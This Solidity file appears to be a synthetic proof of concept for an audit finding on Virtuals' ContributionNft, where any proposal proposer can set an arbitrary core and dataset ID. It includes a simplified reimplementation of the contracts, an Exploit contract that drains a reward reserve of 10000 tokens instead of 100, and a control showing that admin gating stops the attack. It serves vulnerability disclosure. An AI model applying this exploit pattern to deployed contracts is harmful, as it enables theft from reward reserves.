// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*//////////////////////////////////////////////////////////////////////////
    Virtuals ContributionNft.mint is only proposer-gated (Code4rena, #61825)

    SYNTHETIC, cheatcode-free. The proposer, not an admin, writes coreId,
    isModel, and datasetId. ServiceNft.updateImpact copies that core's
    maturity and overwrites datasetId's impact. Minter pays both impacts
    out of the reward reserve.

    Honest core 1 maturity is 100. Core 9 is an existing matured core at
    10000. The proposer points the NFT at core 9 and at their own side NFT
    as datasetId (weight 8000). The reserve pays 10000 instead of 100.
    One transaction. No warp.
//////////////////////////////////////////////////////////////////////////*/

contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Governor {
    mapping(uint256 => address) public proposerOf;
    uint256 public nextId = 1;

    function propose() external returns (uint256 id) {
        id = nextId++;
        proposerOf[id] = msg.sender;
    }

    function proposalProposer(uint256 id) external view returns (address) {
        return proposerOf[id];
    }
}

contract ContributionNft {
    Governor public immutable dao;
    address public immutable admin;
    bool public adminOnly;
    mapping(uint256 => uint8) public coreOf;
    mapping(uint256 => bool) public isModel;
    mapping(uint256 => uint256) public datasetId;
    mapping(uint256 => address) public ownerOf;

    constructor(Governor d, address admin_, bool adminOnly_) {
        dao = d;
        admin = admin_;
        adminOnly = adminOnly_;
    }

    function mint(
        address to,
        uint8 coreId,
        uint256 proposalId,
        uint256 parentId,
        bool isModel_,
        uint256 datasetId_
    ) external returns (uint256) {
        if (adminOnly) {
            require(msg.sender == admin, "Only admin can mint tokens");
        }
        require(msg.sender == dao.proposalProposer(proposalId), "Only proposal proposer can mint Contribution NFT");
        require(parentId != proposalId, "Cannot be parent of itself");
        coreOf[proposalId] = coreId;
        // @> VULN: proposer stores an arbitrary core and datasetId
        isModel[proposalId] = isModel_;
        datasetId[proposalId] = datasetId_;
        ownerOf[proposalId] = to;
        return proposalId;
    }
}

contract ServiceNft {
    ContributionNft public immutable contribution;
    mapping(uint256 => uint256) public impact;
    mapping(uint8 => uint256) public coreMaturity;
    uint256 public constant DATASET_WEIGHT = 8000;

    constructor(ContributionNft c) {
        contribution = c;
        coreMaturity[1] = 100 ether;
        coreMaturity[9] = 10_000 ether;
    }

    function updateImpact(uint256 proposalId) public {
        uint256 rawImpact = coreMaturity[contribution.coreOf(proposalId)];
        uint256 ds = contribution.datasetId(proposalId);
        impact[proposalId] = rawImpact;
        if (ds > 0) {
            impact[ds] = (rawImpact * DATASET_WEIGHT) / 10_000;
            impact[proposalId] = rawImpact - impact[ds];
        }
    }

    function mintService(uint256 proposalId) external {
        require(contribution.isModel(proposalId), "model");
        updateImpact(proposalId);
    }

    function getImpact(uint256 id) external view returns (uint256) {
        return impact[id];
    }
}

contract Minter {
    Token public immutable token;
    ServiceNft public immutable service;
    ContributionNft public immutable contribution;

    constructor(Token t, ServiceNft s, ContributionNft c) {
        token = t;
        service = s;
        contribution = c;
    }

    function mint(uint256 nftId) external {
        uint256 impact = service.getImpact(nftId);
        uint256 amount = impact;
        uint256 ds = contribution.datasetId(nftId);
        uint256 dataAmount = ds > 0 ? service.getImpact(ds) : 0;
        if (amount > 0) {
            require(token.transfer(contribution.ownerOf(nftId), amount), "pay");
        }
        if (dataAmount > 0) {
            require(token.transfer(contribution.ownerOf(ds), dataAmount), "data");
        }
    }
}

contract Exploit {
    Token public token; // CREATE 1
    Governor public dao; // CREATE 2
    ContributionNft public contribution; // CREATE 3
    ServiceNft public service; // CREATE 4
    Minter public minter; // CREATE 5

    uint256 public sideId;
    uint256 public proposalId;
    uint256 public paid;
    uint256 public reserveLeft;
    uint256 public excess;

    uint256 public constant RESERVE = 20_000 ether;

    constructor() {
        token = new Token();
        dao = new Governor();
        contribution = new ContributionNft(dao, address(this), false);
        service = new ServiceNft(contribution);
        minter = new Minter(token, service, contribution);
    }

    function run() external {
        sideId = dao.propose();
        contribution.mint(address(this), 1, sideId, 0, false, 0);
        proposalId = dao.propose();
        contribution.mint(address(this), 9, proposalId, 0, true, sideId);
        service.mintService(proposalId);
        token.mint(address(minter), RESERVE);
        minter.mint(proposalId);
        paid = token.balanceOf(address(this));
        reserveLeft = token.balanceOf(address(minter));
        excess = paid - 100 ether;
        require(paid == 10_000 ether, "paid 10000");
        require(reserveLeft == 10_000 ether, "reserve left 10000");
        require(excess == 9900 ether, "excess 9900");
        require(service.getImpact(proposalId) == 2000 ether, "proposal impact");
        require(service.getImpact(sideId) == 8000 ether, "dataset impact overwritten");
    }
}

contract AdminActor {
    function mintHonest(Governor dao, ContributionNft c, ServiceNft s, Minter m, Token token) external {
        uint256 id = dao.propose();
        c.mint(address(this), 1, id, 0, true, 0);
        s.mintService(id);
        token.mint(address(m), 20_000 ether);
        m.mint(id);
    }
}

contract ControlExploit {
    Token public token;
    Governor public dao;
    AdminActor public admin;
    ContributionNft public contribution;
    ServiceNft public service;
    Minter public minter;

    bool public attackerMintReverted;
    uint256 public paid;

    constructor() {
        token = new Token();
        dao = new Governor();
        admin = new AdminActor();
        contribution = new ContributionNft(dao, address(admin), true);
        service = new ServiceNft(contribution);
        minter = new Minter(token, service, contribution);
    }

    function run() external {
        uint256 id = dao.propose();
        (bool ok,) = address(contribution).call(
            abi.encodeWithSelector(contribution.mint.selector, address(this), uint8(9), id, uint256(0), true, uint256(0))
        );
        attackerMintReverted = !ok;
        admin.mintHonest(dao, contribution, service, minter, token);
        paid = token.balanceOf(address(admin));
        require(attackerMintReverted, "attacker mint reverted");
        require(paid == 100 ether, "honest core pays 100");
    }
}
